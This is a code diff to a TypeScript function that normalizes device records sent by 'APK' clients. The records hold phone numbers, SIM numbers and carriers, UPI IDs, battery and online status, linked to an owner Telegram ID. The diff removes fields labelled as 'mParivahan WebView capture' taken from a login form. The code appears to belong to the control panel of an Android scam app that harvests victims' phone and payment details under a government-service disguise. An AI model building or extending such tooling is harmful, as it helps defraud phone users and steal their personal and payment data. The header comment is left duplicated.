@@ -4,6 +4,8 @@
  * Supports both old APK format (model, phone, sim1/sim2, ping timestamp)
  * and new APK format (modelName, mobNo, sims[], status boolean)
  * + mParivahan WebView capture (vehicleNumber, loginTime, mobNo)
+ * Supports both old APK format (model, phone, sim1/sim2, ping timestamp)
+ * and new APK format (modelName, mobNo, sims[], status boolean).
  */
 export interface NormalizedDevice {
   id: string;
@@ -14,7 +16,7 @@ export interface NormalizedDevice {
   sim1: string;
   sim2: string;
   isOnline: boolean;
-  ping?: string;            // raw timestamp (old APK)
+  ping?: string; // raw timestamp (old APK)
   status?: boolean | string; // boolean or string (new APK)
   ownerTelegramId?: string;
   // extra fields from new APK
@@ -28,32 +30,31 @@ export interface NormalizedDevice {
   joined?: string;
   label?: string;
   service_provider?: string;
-  // mParivahan WebView capture
-  vehicleNumber: string;
-  loginTime?: number;
-  mobNo?: string;
   // raw data for anything else
   raw: Record<string, any>;
 }
 
-export function normalizeDevice(id: string, raw: Record<string, any>): NormalizedDevice {
+export function normalizeDevice(
+  id: string,
+  raw: Record<string, any>
+): NormalizedDevice {
   // ── model ──────────────────────────────────────────────────────────────────
-  const model = raw.modelName || raw.model || 'Unknown';
+  const model = raw.modelName || raw.model || "Unknown";
 
   // ── phone ──────────────────────────────────────────────────────────────────
-  const phone = raw.mobNo || raw.phone || '';
+  const phone = raw.mobNo || raw.phone || "";
 
   // ── SIMs ───────────────────────────────────────────────────────────────────
-  let sim1 = raw.sim1 || '';
-  let sim2 = raw.sim2 || '';
+  let sim1 = raw.sim1 || "";
+  let sim2 = raw.sim2 || "";
   if (Array.isArray(raw.sims)) {
     if (raw.sims[0]) {
       const s = raw.sims[0];
-      sim1 = [s.phoneNumber, s.carrierName].filter(Boolean).join(' · ');
+      sim1 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
     }
     if (raw.sims[1]) {
       const s = raw.sims[1];
-      sim2 = [s.phoneNumber, s.carrierName].filter(Boolean).join(' · ');
+      sim2 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
     }
   }
 
@@ -64,23 +65,18 @@ export function normalizeDevice(id: string, raw: Record<string, any>): Normalize
   if (raw.ping) {
     const t = parseInt(raw.ping, 10);
     if (!isNaN(t)) isOnline = Date.now() - t < 300_000;
-  } else if (typeof raw.status === 'boolean') {
+  } else if (typeof raw.status === "boolean") {
     isOnline = raw.status;
-  } else if (typeof raw.status === 'string') {
-    isOnline = raw.status === 'true' || raw.status === 'online';
+  } else if (typeof raw.status === "string") {
+    isOnline = raw.status === "true" || raw.status === "online";
   }
-
-  // mParivahan capture fields (from WebView login form)
-  const vehicleNumber = String(raw.vehicleNumber || raw.vehicle || '').trim();
-  const loginTime = raw.loginTime ? Number(raw.loginTime) : undefined;
-  const mobNo = String(raw.mobNo || '').trim() || undefined;
 
   return {
     id,
     model,
     phone,
-    upi: raw.upi || '',
-    battery: raw.battery || '',
+    upi: raw.upi || "",
+    battery: raw.battery || "",
     sim1,
     sim2,
     isOnline,
@@ -97,9 +93,6 @@ export function normalizeDevice(id: string, raw: Record<string, any>): Normalize
     joined: raw.joined,
     label: raw.label,
     service_provider: raw.service_provider,
-    vehicleNumber,
-    loginTime,
-    mobNo,
     raw,
   };
 }
